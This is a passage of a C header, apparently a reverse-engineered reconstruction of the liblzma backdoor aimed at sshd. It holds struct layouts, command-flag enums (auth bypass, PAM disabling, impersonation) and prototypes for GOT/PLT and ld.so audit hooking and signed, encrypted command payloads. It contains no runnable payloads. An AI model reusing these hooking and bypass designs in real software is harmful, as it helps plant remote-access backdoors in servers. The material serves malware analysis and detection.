 pfn_RSA_get0_key_t *RSA_get0_key_plt; /* sshd’s PLT slot for RSA_get0_key (used for fallback jumps). */
 pfn_DSA_get0_pqg_t DSA_get0_pqg; /* DSA helpers used while hashing/serialising host keys. */
 pfn_DSA_get0_pub_key_t DSA_get0_pub_key;
 pfn_EC_POINT_point2oct_t EC_POINT_point2oct;
 pfn_EC_KEY_get0_public_key_t EC_KEY_get0_public_key;
 pfn_EC_KEY_get0_group_t EC_KEY_get0_group;
 pfn_EVP_sha256_t EVP_sha256; /* Hash primitive consumed by rsa/dsa key hashers. */
 pfn_RSA_get0_key_t RSA_get0_key_resolved; /* Direct pointer into libcrypto (bypassing PLT) for payload parsing. */
 pfn_BN_num_bits_t BN_num_bits;
 pfn_EVP_PKEY_new_raw_public_key_t EVP_PKEY_new_raw_public_key;
 pfn_EVP_MD_CTX_new_t EVP_MD_CTX_new;
 pfn_EVP_DigestVerifyInit_t EVP_DigestVerifyInit;
 pfn_EVP_DigestVerify_t EVP_DigestVerify;
 pfn_EVP_MD_CTX_free_t EVP_MD_CTX_free;
 pfn_EVP_PKEY_free_t EVP_PKEY_free;
 pfn_EVP_CIPHER_CTX_new_t EVP_CIPHER_CTX_new;
 pfn_EVP_DecryptInit_ex_t EVP_DecryptInit_ex;
 pfn_EVP_DecryptUpdate_t EVP_DecryptUpdate;
 pfn_EVP_DecryptFinal_ex_t EVP_DecryptFinal_ex;
 pfn_EVP_CIPHER_CTX_free_t EVP_CIPHER_CTX_free;
 pfn_EVP_chacha20_t EVP_chacha20; /* ChaCha primitive used to decrypt payload bodies. */
 pfn_RSA_new_t RSA_new;
 pfn_BN_dup_t BN_dup;
 pfn_BN_bin2bn_t BN_bin2bn;
 pfn_RSA_set0_key_t RSA_set0_key;
 pfn_EVP_Digest_t EVP_Digest;
 pfn_RSA_sign_t RSA_sign;
 pfn_BN_bn2bin_t BN_bn2bin;
 pfn_RSA_free_t RSA_free;
 pfn_BN_free_t BN_free;
 libc_imports_t *libc; /* Back-pointer so RSA/MM hooks can reach libc shims. */
 u32 resolved_imports_count; /* Number of successfully resolved libcrypto symbols (init expects 0x1d). */
 u32 reserved_imports_padding; /* Alignment padding after the count. */
} imported_funcs_t;

struct ssh;

struct sshbuf;

typedef struct ssh ssh;

typedef struct sshbuf sshbuf;

typedef int (*sshd_monitor_func_t)(struct ssh *ssh, int sock, struct sshbuf *m);

/*
 * Decrypted command blob staged by `mm_answer_keyallowed`: starts with a length, 0x3a-byte signed header (ending in the payload type), a 0x72-byte Ed448 signature, and then the attacker-controlled body beginning at offset 0xae with a caller-supplied payload_data_offset.
 */
typedef struct __attribute__((packed)) sshd_payload_ctx {
 u16 payload_total_size; /* Total decrypted payload length (header + trailer + body). */
 u8 signed_header_prefix[0x39]; /* First 0x39 bytes of header metadata that the Ed448 signature covers. */
 u8 command_type; /* 0x1 => stash mm_answer_authpassword payload, 0x2 => mm_answer_keyverify reply, 0x3 => system/elevate command. */
 u8 ed448_signature[0x72];
 u16 body_payload_offset; /* Offset into `payload_body` where the attacker-supplied command stream begins. */
 u8 payload_body[]; /* Decrypted body (begins at offset 0xae of the blob, includes padding + command bytes). */
} sshd_payload_ctx_t;

/*
 * Snapshot of the sshd monitor state that tracks where each `mm_answer_*` handler lives, whether it has already been hooked, and which request IDs correspond to the sensitive operations we intercept.
 */
typedef struct __attribute__((packed)) sshd_ctx {
 BOOL have_mm_answer_keyallowed;
 BOOL have_mm_answer_authpassword;
 BOOL have_mm_answer_keyverify;
 u8 hook_flags_padding[4];
 sshd_monitor_func_t mm_answer_authpassword_hook;
 void *mm_answer_keyallowed;
 void *mm_answer_keyverify;
 void *mm_answer_authpassword_start;
 void *mm_answer_authpassword_end;
 sshd_monitor_func_t *mm_answer_authpassword_ptr;
 int monitor_reqtype_authpassword;
 u8 authpassword_padding[4];
 sshd_monitor_func_t *mm_answer_keyallowed_start;
 void *mm_answer_keyallowed_end;
 void *mm_answer_keyallowed_ptr;
 u32 mm_answer_keyallowed_reqtype;
 u8 keyallowed_padding[4];
 void *mm_answer_keyverify_start;
 void *mm_answer_keyverify_end;
 void *mm_answer_keyverify_ptr;
 u8 keyverify_padding[4];
 u16 writebuf_size;
 u8 writebuf_padding[2];
 u8 *writebuf;
 u8 authpayload_len_bytes[8];
 sshd_payload_ctx_t *pending_authpayload;
 char *STR_unknown_ptr;
 void *mm_request_send_start;
 void *mm_request_send_end;
 u32 auth_root_allowed_flag;
 u32 sshd_ctx_reserved;
 int *use_pam_ptr;
 int *permit_root_login_ptr;
 char *STR_without_password;
 char *STR_publickey;
} sshd_ctx_t;

/*
 * Mirror of sshd’s syslog verbosity levels so the hook can translate its own severity decisions into whatever the daemon expects.
 */
typedef enum {
 SYSLOG_LEVEL_QUIET,
 SYSLOG_LEVEL_FATAL,
 SYSLOG_LEVEL_ERROR,
 SYSLOG_LEVEL_INFO,
 SYSLOG_LEVEL_VERBOSE,
 SYSLOG_LEVEL_DEBUG1,
 SYSLOG_LEVEL_DEBUG2,
 SYSLOG_LEVEL_DEBUG3,
 SYSLOG_LEVEL_NOT_SET = -1
} LogLevel;

typedef void (*log_handler_fn)(
 LogLevel level,
 int forced,
 const char *msg,
 void *ctx);

typedef void (*mm_log_handler_fn)(LogLevel level, int forced, const char *msg, void *ctx);

/*
 * Captures the moving pieces required to hook sshd’s logging path, including the original handler, replacement trampolines, format strings, and guard booleans to keep syslog stable.
 */
typedef struct __attribute__((packed)) sshd_log_ctx {
 BOOL logging_disabled;
 BOOL log_hooking_possible;
 BOOL syslog_disabled;
 u8 log_padding[4];
 char *STR_percent_s;
 char *STR_Connection_closed_by;
 char *STR_preauth;
 char *STR_authenticating;
 char *STR_user;
 void *log_handler_ptr;
 void *log_handler_ctx_ptr;
 log_handler_fn orig_log_handler;
 void *orig_log_handler_ctx;
 void *sshlogv;
 mm_log_handler_fn mm_log_handler;
} sshd_log_ctx_t;

/*
 * Compressed description of where the interesting fields live inside `struct kex` (qword index plus byte offset) so we can adjust to layout shifts between builds.
 */
typedef union __attribute__((packed)) sshd_offsets_kex {
 struct __attribute__((packed)) {
  u8 kex_qword_index;
  u8 pkex_offset;
 };
 u16 value;
} sshd_offsets_kex_t;

/*
 * Same idea as `sshd_offsets_kex_t` but for the sshbuf backing storage; stores the indices of the data pointer and size field we need to rewrite.
 */
typedef union __attribute__((packed)) sshd_offsets_sshbuf {
 struct __attribute__((packed)) {
  u8 sshbuf_data_qword_index;
  u8 sshbuf_size_qword_index;
 };
 u16 value;
} sshd_offsets_sshbuf_t;

/*
 * Convenience wrapper that groups the individual offset unions for simultaneous propagation from the scanning routines into the runtime context.
 */
typedef struct __attribute__((packed)) sshd_offsets_fields {
 sshd_offsets_kex_t kex;
 sshd_offsets_sshbuf_t sshbuf;
} sshd_offsets_fields_t;

/*
 * 32-bit union that packs the discovered offsets and exposes them both as structured fields and as a raw integer when we need atomic updates.
 */
typedef struct __attribute__((packed)) sshd_offsets {
 union {
  struct {
   union {
    sshd_offsets_fields_t fields;
    u32 value;
   };
  };
  u32 raw_value;
 };
} sshd_offsets_t;

/*
 * Authoritative runtime state for the backdoor.
 * It wires together imported function tables, sshd metadata, decrypted payload buffers, socket scratch space, and secret shift operations so every hook can reach consistent data.
 */
typedef struct __attribute__((packed)) global_context {
 BOOL uses_endbr64;
 u32 endbr_padding;
 imported_funcs_t *imported_funcs;
 libc_imports_t* libc_imports;
 BOOL disable_backdoor;
 u32 disable_padding;
 sshd_ctx_t *sshd_ctx;
 struct sensitive_data *sshd_sensitive_data;
 sshd_log_ctx_t *sshd_log_ctx;
 char *STR_ssh_rsa_cert_v01_openssh_com;
 char *STR_rsa_sha2_256;
 struct monitor **struct_monitor_ptr_address;
 u32 exit_flag;
 sshd_offsets_t sshd_offsets;
 void *sshd_code_start;
 void *sshd_code_end;
 void *sshd_data_start;
 void *sshd_data_end;
 void *sshd_main;
 void *lzma_code_start;
 void *lzma_code_end;
 u32 uid;
 u32 uid_padding;
 u64 sock_read_buf_size;
 u8 sock_read_buf[64];
 u64 payload_data_size;
 u64 current_data_size;
 u8 *payload_data;
 sshd_payload_ctx_t *sshd_payload_ctx;
 u32 sshd_host_pubkey_idx;
 u32 payload_state;
 u8 secret_data[57];
 u8 shift_operations[31];
 u32 num_shifted_bits;
 u32 secret_data_padding;
} global_context_t;

/*
 * Tiny structure that stage-one drops into `.bss` so later stages can find the `global_context_t`, the active hooks, and the exported helper thunks without re-scanning memory.
 */
typedef struct __attribute__((packed)) backdoor_shared_globals {
 sshd_monitor_func_t authpassword_hook_entry; /* Jump target stage one publishes so later stages can patch mm_answer_authpassword(). */
 pfn_EVP_PKEY_set1_RSA_t evp_set1_rsa_hook_entry; /* Exported EVP hook trampoline shared between setup and the RSA key handlers. */
 global_context_t **global_ctx_slot; /* Pointer to the loader-owned `global_ctx` pointer so freshly installed hooks can find the singleton state. */
} backdoor_shared_globals_t;

/*
 * All of the state we steal from the dynamic loader when we patch the audit interfaces: pointers to `_dl_audit_symbind_alt`, link-map fields, cached audit bitmasks, and copies of the hooked GOT entries.
 */
typedef struct __attribute__((packed)) ldso_ctx {
 u8 _unknown1459[0x40];
 u32 *libcrypto_auditstate_bindflags_ptr;
 u32 libcrypto_auditstate_bindflags_old_value;
 u8 _unknown1476[0x4];
 u32 *sshd_auditstate_bindflags_ptr;
 u32 sshd_auditstate_bindflags_old_value;
 u8 _unknown1493[0x4];
 void* sshd_link_map_l_audit_any_plt_addr;
 u8 link_map_l_audit_any_plt_bitmask;
 u8 _unknown1510[0x7];
 struct audit_ifaces **_dl_audit_ptr;
 unsigned int *_dl_naudit_ptr;
 struct audit_ifaces hooked_audit_ifaces;
 u8 _unknown1538[0x30];
 char **libcrypto_l_name;
 dl_audit_symbind_alt_fn _dl_audit_symbind_alt;
 size_t _dl_audit_symbind_alt__size;
 pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
 pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;
 pfn_RSA_get0_key_t hook_RSA_get0_key;
 imported_funcs_t *imported_funcs;
 u64 hooks_installed;
} ldso_ctx_t;

/*
 * Blob that actually lives inside liblzma’s data segment and holds the loader context (`ldso_ctx_t`), `global_context_t`, resolved imports, sshd/log contexts, and the signed payload bytes the implant enforces.
 */
typedef struct __attribute__((packed)) backdoor_hooks_data {
 ldso_ctx_t ldso_ctx; /* Snapshot of ld.so state (audit tables, hook trampolines, import pointers) that we install into liblzma. */
 global_context_t global_ctx; /* Runtime configuration shared between hooks (payload buffers, sshd metadata, shift cursors, etc.). */
 imported_funcs_t imported_funcs; /* Copy of the resolved libcrypto/libc entry points we patch so hooks can call the originals. */
 sshd_ctx_t sshd_ctx; /* Captured sshd function pointers/state used by the key hooks. */
 libc_imports_t libc_imports; /* Writable mirror of the libc imports resolved during setup. */
 sshd_log_ctx_t sshd_log_ctx; /* Book-keeping for the mm_log_handler shim (toggle + buffer). */
 u64 signed_data_size; /* Length in bytes of the attacker-signed payload that trails this struct. */
 u8 signed_data; /* First byte of the signed payload blob; rest of the bytes follow immediately in memory. */
} backdoor_hooks_data_t;

/*
 * Ephemeral orchestrator that stage-one uses while replaying the GOT patches; exposes pointers to the shared globals, the loader callbacks, and the mm_* hooks we ultimately install.
 */
typedef struct __attribute__((packed)) backdoor_hooks_ctx {
 u8 bootstrap_padding[0x30]; /* Stage-two zeroes this scratch space before wiring up the pointers. */
 backdoor_shared_globals_t *shared_globals; /* Published pointer to the shared globals block (NULL until init_shared_globals succeeds). */
 backdoor_hooks_data_t **hooks_data_slot; /* Address of the liblzma `hooks_data` pointer we update once the blob is parsed. */
 audit_symbind64_fn symbind64_handler; /* Backdoor symbind trampoline installed into ld.so. */
 pfn_RSA_public_decrypt_t rsa_public_decrypt_hook; /* RSA_public_decrypt replacement pushed into sshd’s PLT. */
 pfn_RSA_get0_key_t rsa_get0_key_hook; /* RSA_get0_key replacement pushed into sshd’s PLT. */
 mm_log_handler_fn mm_log_handler_hook; /* mm_log_handler shim we install when hooking sshd. */
 void *reserved_ptr0; /* Alignment/reserved slot (unused). */
 u64 bootstrap_flags; /* Scratch flags touched by init_hooks_ctx (set to 0x4 during bootstrap). */
 sshd_monitor_func_t mm_answer_keyallowed_hook; /* mm_answer_keyallowed hook entry point. */
 sshd_monitor_func_t mm_answer_keyverify_hook; /* mm_answer_keyverify hook entry point. */
 void *reserved_ptr1; /* Alignment/reserved slot for future monitor hooks. */
} backdoor_hooks_ctx_t;

/*
 * Argument bundle handed to `backdoor_setup` so the second stage has references to the shared globals, hook descriptors, dummy lzma state, and the entry context it should continue from.
 */
typedef struct __attribute__((packed)) backdoor_setup_params {
 u8 _unknown1649[0x8];
 backdoor_shared_globals_t *shared;
 backdoor_hooks_ctx_t *hook_params;
 lzma_check_state dummy_check_state;
 elf_entry_ctx_t *entry_ctx;
} backdoor_setup_params_t;

/*
 * Pointers to each parsed ELF info block (main binary, ld.so, libc, liblzma, libcrypto) so helper routines can iterate the fleet without repeating lookups.
 */
typedef struct __attribute__((packed)) elf_handles {
 elf_info_t *main;
 elf_info_t *dynamic_linker;
 elf_info_t *libc;
 elf_info_t *liblzma;
 elf_info_t *libcrypto;
} elf_handles_t;

/*
 * Lightweight bootstrap record containing the `elf_handles_t`, ld.so’s header, and a pointer to `__libc_stack_end`; used while pivoting into the loader context.
 */
typedef struct __attribute__((packed)) main_elf {
 elf_handles_t *elf_handles;
 Elf64_Ehdr *dynamic_linker_ehdr;
 void **__libc_stack_end;
} main_elf_t;

/*
 * Master structure built during the loader pass that holds every `link_map`, the parsed `elf_info_t` objects for key libraries, resolved libc imports, string references, and the fake allocator we expose to liblzma.
 */
typedef struct backdoor_data backdoor_data_t;

/*
 * Pairs the monolithic `backdoor_data_t` blob with its `elf_handles_t` so loader helpers can take one argument yet still access both structures.
 */
typedef struct __attribute__((packed)) backdoor_data_handle {
 backdoor_data_t *data;
 elf_handles_t *elf_handles;
} backdoor_data_handle_t;

/*
 * Single entry in the string-reference table that records which encoded string we matched along with the function bounds and the exact xref address.
 */
typedef struct __attribute__((packed)) string_item {
 EncodedStringId string_id;
 u32 reserved;
 void *func_start;
 void *func_end;
 void *xref;
} string_item_t;

/*
 * Fixed-size array of `string_item_t` records covering the 27 status strings we track inside sshd to anchor later scans.
 */
typedef struct __attribute__((packed)) string_references {
 string_item_t entries[27];
} string_references_t;

/*
 * Master structure built during the loader pass that holds every `link_map`, the parsed `elf_info_t` objects for key libraries, resolved libc imports, string references, and the fake allocator we expose to liblzma.
 */
typedef struct __attribute__((packed)) backdoor_data {
 struct link_map *main_map;
 struct link_map *dynamic_linker_map;
 struct link_map *liblzma_map;
 struct link_map *libcrypto_map;
 struct link_map *libsystemd_map;
 struct link_map *libc_map;
 elf_handles_t elf_handles;
 backdoor_data_handle_t data_handle;
 elf_info_t main_info;
 elf_info_t dynamic_linker_info;
 elf_info_t libc_info;
 elf_info_t liblzma_info;
 elf_info_t libcrypto_info;
 libc_imports_t libc_imports;
 string_references_t string_refs;
 lzma_allocator fake_allocator;
 lzma_allocator *import_resolver;
} backdoor_data_t;

/*
 * Scratch arguments passed around while iterating dependent libraries; stitches together the master data blob, elf handles, resolved PLT stubs, and pointers back to the hook data so each pass can install the necessary trampolines.
 */
typedef struct __attribute__((packed)) backdoor_shared_libraries_data {
 backdoor_data_t *shared_maps; /* Aggregated link_map/elf_info blob populated while scanning r_debug. */
 elf_handles_t *elf_handles; /* Typed handles for each parsed ELF (main, libc, liblzma, etc.). */
 void **rsa_public_decrypt_slot; /* Address of the GOT/PLT slot we overwrite with our RSA_public_decrypt hook. */
 void **evp_set1_rsa_slot; /* Address of sshd’s EVP_PKEY_set1_RSA PLT entry for patching. */
 void **rsa_get0_key_slot; /* Address of sshd’s RSA_get0_key PLT entry for patching. */
 backdoor_hooks_data_t **hooks_data_slot; /* Pointer to the liblzma-resident hook blob pointer so we can stash the parsed address. */
 libc_imports_t *libc_imports; /* libc import table that needs resolving once libc is parsed. */
} backdoor_shared_libraries_data_t;

/*
 * Bit-packed cursor (3-bit bit index + 29-bit byte index) used when reconstructing the obfuscated secret data stream stored inside the RSA payload.
 */
typedef union {
 u32 index;
 int signed_index;
 struct {
  u32 bit_index : 3;
  u32 byte_index : 29;
 };
} secret_data_shift_cursor_t;

/*
 * One decoded chunk of the secret data stream including the original code reference, the shift cursor, the operation index, and bookkeeping counters.
 */
typedef struct __attribute__((packed)) secret_data_item {
 u8 *code;
 secret_data_shift_cursor_t shift_cursor;
 u32 operation_index;
 u32 shift_count;
 u32 index;
} secret_data_item_t;

/*
 * Header laid over the RSA modulus bytes; fields A/B/C encode the command family and payload lengths before we decrypt the body.
 */
typedef struct __attribute__((packed)) key_payload_hdr {
 union {
  u8 bytes[16];
  struct __attribute__((packed)) {
   u32 field_a;
   u32 field_b;
   u64 field_c;
  };
 };
} backdoor_payload_hdr_t;

/*
 * Two-byte overlay that lets us treat the final argument byte pair as either raw data or as a little-endian size value when computing payload lengths.
 */
typedef union __attribute__((packed)) {
 u8 value[2];
 u16 size;
} u_cmd_arguments_t;

/*
 * Command flags (three flag bytes plus the variable-size union) that describe how the monitor thread should interpret the decrypted payload.
 */
typedef struct __attribute__((packed)) cmd_arguments {
 u8 flags1;
 u8 flags2;
 u8 flags3;
 u_cmd_arguments_t u;
} cmd_arguments_t;

/*
 * Decrypted payload layout containing the Ed448 signature, parsed command arguments, and the opaque body that holds monitor instructions.
 */
typedef struct __attribute__((packed)) key_payload_body {
 u8 signature[114];
 cmd_arguments_t args;
 u8 data[0x1A1];
} backdoor_payload_body_t;

/*
 * Wrapper around the payload header/body union so helpers can address the entire 0x228-byte buffer or reason about header/body separately.
 */
typedef struct __attribute__((packed)) backdoor_payload {
 union {
  u8 data[0x228];
  struct __attribute__((packed)) {
   backdoor_payload_hdr_t header;
   backdoor_payload_body_t body;
  };
 };
} backdoor_payload_t;

/*
 * Variable-length framing used while streaming RSA payload chunks; repeats the header, length field, and byte array to support incremental decrypts.
 */
typedef struct __attribute__((packed)) key_payload {
 union {
  u8 data[0];
  struct __attribute__((packed)) {
   backdoor_payload_hdr_t hdr;
   u16 body_length;
   u8 body[0];
  };
 };
} key_payload_t;

/*
 * Interpretation of the first byte of the `cmd_arguments_t` block (packet sizing hints, PAM disablement, socket index encoding, etc.).
 */
enum CommandFlags1 {
 X_FLAGS1_8BYTES = 0x1,
 X_FLAGS1_SETLOGMASK = 0x4,
 X_FLAGS1_SOCKET_INDEX = 0x20,
 X_FLAGS1_DISABLE_PAM = 0x40,
 X_FLAGS1_NO_EXTENDED_SIZE = 0x80
};

/*
 * Second command flag byte which governs impersonation behaviour, monitor request overrides, auth bypass toggles, and which socket descriptor is referenced.
 */
enum CommandFlags2 {
 X_FLAGS2_IMPERSONATE = 0x1,
 X_FLAGS2_CHANGE_MONITOR_REQ = 0x2,
 X_FLAGS2_AUTH_BYPASS = 0x4,
 X_FLAGS2_CONTINUATION = 0x40,
 X_FLAGS2_PSELECT = 0xC0,
 X_FLAGS2_SOCKFD_MASK = 0x78
};

/*
 * Final command flag byte indicating the numeric socket identifier plus monitor request value derived from the payload.
 */
enum CommandFlags3 {
 X_FLAGS3_SOCKET_NUM = 0x1F,
 X_FLAGS3_MONITOR_REQ_VAL = 0x3F
};

/*
 * Working context for RSA-related operations; caches the modulus/exponent pointers, parsed command flags, decrypted payload, IV, and Ed448 key material extracted from the host key.
 */
typedef struct __attribute__((packed)) key_ctx {
 const BIGNUM *rsa_n;
 const BIGNUM *rsa_e;
 cmd_arguments_t args;
 backdoor_payload_t payload;
 u8 payload_digest[32];
 u8 payload_nonce[16];
 u8 ivec[16];
 u8 ed448_key[57];
 u8 ed448_key_padding[2];
} key_ctx_t;

/*
 * Structure passed into the monitor thread once a payload is decrypted; exposes the decoded command, RSA key pointers, payload body pointer/size, and the sshd RSA handle.
 */
typedef struct __attribute__((packed)) monitor_data {
 u32 cmd_type;
 u8 reserved0[4];
 cmd_arguments_t *args;
 const BIGNUM *rsa_n;
 const BIGNUM *rsa_e;
 u8 *payload_body;
 u16 payload_body_size;
 u8 reserved1[6];
 RSA *rsa;
} monitor_data_t;

/*
 * Union that either exposes the fully-populated `monitor_data_t` or lets the caller treat the same memory as a flat 608-byte scratch buffer during staging.
 */
typedef union __attribute__((packed)) backdoor_runtime_data {
 monitor_data_t monitor;
 u8 data[608];
} backdoor_runtime_data_t;

/*
 * Large bookkeeping record backing `run_backdoor_commands`; maintains payload sizing, hostkey metadata, socket input buffers, per-command runtime state, and the embedded `key_ctx_t` used across iterations.
 */
typedef struct __attribute__((packed)) run_backdoor_commands_data {
 u64 body_size;
 BOOL *p_do_orig;
 u64 payload_size;
 u64 hostkey_hash_offset;
 RSA *rsa;
 u8 *payload_data_ptr;
 u8 *ed448_key_ptr;
 u64 num_keys;
 u8 key_index_padding[4];
 u32 key_cur_idx;
 u64 key_prev_idx;
 u8 socket_data_padding[7];
 u8 unk57;
 union {
  struct __attribute__((packed)) {
   int socket_fd;
   u32 fd_recv_size;
   u8 fd_recv_buf[64];
  } sock;
  struct __attribute__((packed)) {
   u64 num_host_keys;
   u64 num_host_pubkeys;
   u8 ed448_key[57];
  } keys;
 } u;
 u8 runtime_padding[7];
 backdoor_runtime_data_t data;
 key_ctx_t kctx;
} run_backdoor_commands_data_t;

/*
 * Constant offsets harvested from liblzma that describe where the cpuid GOT slot and stage-two trampoline live so the hook can update them without rescanning instructions.
 */
typedef struct __attribute__((packed)) backdoor_cpuid_reloc_consts {
 ptrdiff_t cpuid_random_symbol_got_offset;
 u64 cpuid_got_index;
 ptrdiff_t backdoor_init_stage2_got_offset;
} backdoor_cpuid_reloc_consts_t;

/*
 * Similar relocation constants for the `__tls_get_addr` thunk so we can locate the PLT stub and randomized GOT slot at runtime.
 */
typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {
 ptrdiff_t tls_get_addr_plt_offset;
 ptrdiff_t tls_get_addr_random_symbol_got_offset;
} backdoor_tls_get_addr_reloc_consts_t;

typedef int (*init_hook_functions_fn)(backdoor_hooks_ctx_t *funcs);

typedef void *(*elf_symbol_get_addr_fn)(elf_info_t *elf_info, EncodedStringId encoded_string_id);

typedef BOOL (*elf_parse_fn)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);

/*
 * Mini vtable exported back into liblzma that holds callable helpers (initializing hook structs, parsing an ELF header, resolving symbols) so the stage-two code can reuse our C helpers.
 */
typedef struct __attribute__((packed)) elf_functions {
 u64 reserved_before_init;
 init_hook_functions_fn init_hook_functions;
 u64 reserved_before_symbol_lookup_0;
 u64 reserved_before_symbol_lookup_1;
 elf_symbol_get_addr_fn elf_symbol_get_addr;
 u64 reserved_before_elf_parse;
 elf_parse_fn elf_parse;
} elf_functions_t;

/*
 * Dummy `lzma_allocator` instance that mimics the original callback table; used when the implant needs to satisfy allocation requests without delegating to libc.
 */
typedef struct __attribute__((packed)) fake_lzma_allocator {
 u64 reserved_allocator_slot;
 lzma_allocator allocator;
} fake_lzma_allocator_t;

/*
 * Shared context for the instruction-search helpers; tracks the scan range, the byte pattern we expect, the output register captures, and provides access to hook/import state during complex searches.
 */
typedef struct __attribute__((packed)) instruction_search_ctx
{
 u8 *start_addr;
 u8 *end_addr;
 u8 *offset_to_match;
 u32 *output_register_to_match;
 u8 *output_register;
 BOOL result;
 u8 search_padding[4];
 backdoor_hooks_data_t *hooks;
 imported_funcs_t *imported_funcs;
} instruction_search_ctx_t;

extern BOOL sshd_proxy_elevate(monitor_data_t *args, global_context_t *ctx);

extern BOOL x86_dasm(dasm_ctx_t *ctx, u8 *code_start, u8 *code_end);

extern BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx);

extern BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement);

extern BOOL find_instruction_with_mem_operand(
 u8 *code_start,
 u8 *code_end,
 dasm_ctx_t *dctx,
 void *mem_address
);

extern BOOL find_lea_instruction_with_mem_operand(
 u8 *code_start,
 u8 *code_end,
 dasm_ctx_t *dctx,
 void *mem_address
);

extern BOOL find_add_instruction_with_mem_operand(
 u8 *code_start,
 u8 *code_end,
 dasm_ctx_t *dctx,
 void *mem_address
);

extern BOOL find_mov_lea_instruction(
 u8 *code_start,
 u8 *code_end,
 BOOL is_64bit_operand,
 BOOL load_flag,
 dasm_ctx_t *dctx
);

extern BOOL find_mov_instruction(
 u8 *code_start,
 u8 *code_end,
 BOOL is_64bit_operand,
 BOOL load_flag,
 dasm_ctx_t *dctx
);

extern BOOL find_instruction_with_mem_operand_ex(
 u8 *code_start,
 u8 *code_end,
 dasm_ctx_t *dctx,
 int opcode,
 void *mem_address
);

extern BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part);

extern u8 *find_string_reference(
 u8 *code_start,
 u8 *code_end,
 const char *str
);

extern u8 *elf_find_string_reference(
 elf_info_t *elf_info,
 EncodedStringId encoded_string_id,
 u8 *code_start,
 u8 *code_end
);

extern BOOL find_reg2reg_instruction(u8 *code_start, u8 *code_end, dasm_ctx_t *dctx);

extern BOOL find_function_prologue(u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode);

extern BOOL find_function(
 u8 *code_start,
 void **func_start,
 void **func_end,
 u8 *search_base,
 u8 *code_end,
 FuncFindType find_mode);

extern BOOL elf_contains_vaddr(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);

extern BOOL elf_contains_vaddr_impl(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);

extern BOOL elf_contains_vaddr_relro(elf_info_t *elf_info, u64 vaddr, u64 size, u32 p_flags);

extern BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);

extern BOOL is_gnu_relro(Elf64_Word p_type, u32 addend);

extern BOOL main_elf_parse(main_elf_t *main_elf);

extern char *check_argument(char arg_first_char, char* arg_name);

extern BOOL process_is_sshd(elf_info_t *elf, u8 *stack_end);

extern BOOL elf_find_string_references(elf_info_t *elf_info, string_references_t *refs);

extern Elf64_Sym *elf_symbol_get(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);

extern void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id);

extern void *elf_get_code_segment(elf_info_t *elf_info, u64 *pSize);

extern void *elf_get_rodata_segment(elf_info_t *elf_info, u64 *pSize);

extern void *elf_get_data_segment(elf_info_t *elf_info, u64 *pSize, BOOL get_alignment);

extern void *elf_get_reloc_symbol(
 elf_info_t *elf_info,
 Elf64_Rela *relocs,
 u32 num_relocs,
 u64 reloc_type,
 EncodedStringId encoded_string_id);

extern void *elf_get_plt_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);

extern void *elf_get_got_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);

extern Elf64_Rela *elf_find_rela_reloc(
 elf_info_t *elf_info,
 EncodedStringId encoded_string_id,
 u64 reloc_type);

extern Elf64_Relr *elf_find_relr_reloc(
 elf_info_t *elf_info,
 EncodedStringId encoded_string_id);

extern BOOL elf_find_function_pointer(
 StringXrefId xref_id,
 void **pOutCodeStart, void **pOutCodeEnd,
 void **pOutFptrAddr, elf_info_t *elf_info,
 string_references_t *xrefs,
 global_context_t *ctx);

extern char *elf_find_string(
 elf_info_t *elf_info,
 EncodedStringId *stringId_inOut,
 void *rodata_start_ptr);

extern lzma_allocator *get_lzma_allocator(void);

extern fake_lzma_allocator_t *get_lzma_allocator_address(void);

extern void *fake_lzma_alloc(void *opaque, size_t nmemb, size_t size);

extern void fake_lzma_free(void *opaque, void *ptr);

extern elf_functions_t *get_elf_functions_address(void);

extern BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor);

extern BOOL secret_data_append_from_code(
 void *code_start,
 void *code_end,
 secret_data_shift_cursor_t shift_cursor,
 unsigned shift_count, BOOL start_from_call);

extern BOOL secret_data_append_item(
 secret_data_shift_cursor_t shift_cursor,
 unsigned operation_index,
 unsigned shift_count,
 int index, u8 *code);

typedef BOOL (*secret_data_appender_fn)(
  secret_data_shift_cursor_t shift_cursor,
  unsigned operation_index,
  unsigned shift_count,
  int index,
  u8 *code);

extern BOOL secret_data_append_items(
 secret_data_item_t *items,
 u64 items_count,
 secret_data_appender_fn appender);

extern BOOL secret_data_append_from_address(
 void *addr,
 secret_data_shift_cursor_t shift_cursor,
 unsigned shift_count, unsigned operation_index);

extern BOOL secret_data_append_singleton(
 u8 *call_site, u8 *code,
 secret_data_shift_cursor_t shift_cursor,
 unsigned shift_count, unsigned operation_index);

extern BOOL secret_data_append_from_call_site(
 secret_data_shift_cursor_t shift_cursor,
 unsigned shift_count, unsigned operation_index,
 BOOL bypass
);

extern BOOL backdoor_setup(backdoor_setup_params_t *params);

extern void init_ldso_ctx(ldso_ctx_t *ldso_ctx);

extern unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame);

extern void * backdoor_init(elf_entry_ctx_t *state, u64 *caller_frame);

extern void init_elf_entry_ctx(elf_entry_ctx_t *ctx);

extern void update_got_offset(elf_entry_ctx_t *ctx);

extern void update_cpuid_got_index(elf_entry_ctx_t *ctx);

extern BOOL backdoor_init_stage2(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);

extern BOOL resolve_libc_imports(
 struct link_map *libc,
 elf_info_t *libc_info,
 libc_imports_t *imports
);

extern BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data);

extern BOOL process_shared_libraries_map(struct link_map *r_map, backdoor_shared_libraries_data_t *data);

extern BOOL chacha_decrypt(
 u8 *in, int inl,
